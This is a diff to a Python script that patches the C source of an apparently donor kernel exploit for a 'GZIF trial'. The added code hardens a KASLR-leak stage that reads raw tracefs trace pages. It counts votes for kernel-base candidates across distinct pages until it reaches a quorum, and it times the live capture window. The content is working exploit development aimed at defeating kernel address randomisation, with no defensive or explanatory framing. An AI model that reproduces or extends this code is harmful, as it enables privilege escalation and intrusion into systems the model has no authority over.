@@ -212,6 +212,57 @@ static int gzif_tracefs_reset(const char *tracing_on,
         '  }\n\n  if (!found) {',
         "required control restoration before successful return",
     )
+    # The donor can satisfy its two-vote quorum with repeated loose
+    # matches in the SAME raw trace page. In the GZIF trial, collapse
+    # duplicates to one vote per page and require two distinct pages.
+    read_anchor = (
+        '      if (parse_trace_page(page, (size_t)got, votes, candidate_out)) return 1;'
+    )
+    read_replacement = r"""      /* GZIF: duplicate event offsets inside one raw trace page are
+       * not independent KASLR witnesses. Keep at most one vote per
+       * candidate for each separately read trace page.
+       */
+      unsigned int page_votes[TARGET_KASLR_CANDIDATE_COUNT] = {0};
+      uint64_t unused_candidate = 0;
+      (void)parse_trace_page(page, (size_t)got, page_votes, &unused_candidate);
+      for (size_t slot = 0; slot < TARGET_KASLR_CANDIDATE_COUNT; slot++) {
+        if (!page_votes[slot]) continue;
+        if (votes[slot] < UINT32_MAX) votes[slot]++;
+        if (votes[slot] >= TARGET_KASLR_QUORUM) {
+          *candidate_out = (uint64_t)slot * TARGET_KASLR_ALIGNMENT;
+          fprintf(stderr, "stage=gzif-kaslr-distinct-pages-quorum=%u\n",
+                  votes[slot]);
+          return 1;
+        }
+      }"""
+    text = once(
+        text, read_anchor, read_replacement,
+        "GZIF requires independent trace pages for KASLR quorum",
+    )
+    # Donor's sample_ms begins AFTER prime_block_io() has filled the
+    # rings. Report the total live trace capture window separately.
+    prime_anchor = '  prime_block_io();\n  prime_block_io();'
+    prime_replacement = (
+        '  uint64_t gzif_trace_started_ms = monotonic_ms();\n'
+        + prime_anchor
+    )
+    text = once(
+        text, prime_anchor, prime_replacement,
+        "start GZIF live capture timer before priming",
+    )
+    finish_anchor = '  uint64_t finished_ms = monotonic_ms();'
+    finish_replacement = r"""  uint64_t gzif_trace_finished_ms = monotonic_ms();
+  uint64_t gzif_trace_elapsed_ms =
+      gzif_trace_started_ms && gzif_trace_finished_ms >= gzif_trace_started_ms
+          ? gzif_trace_finished_ms - gzif_trace_started_ms
+          : 0;
+  fprintf(stderr, "stage=gzif-tracefs-live-capture-ms=%llu\n",
+          (unsigned long long)gzif_trace_elapsed_ms);
+""" + finish_anchor
+    text = once(
+        text, finish_anchor, finish_replacement,
+        "total GZIF trace capture duration",
+    )
     return text
 
 
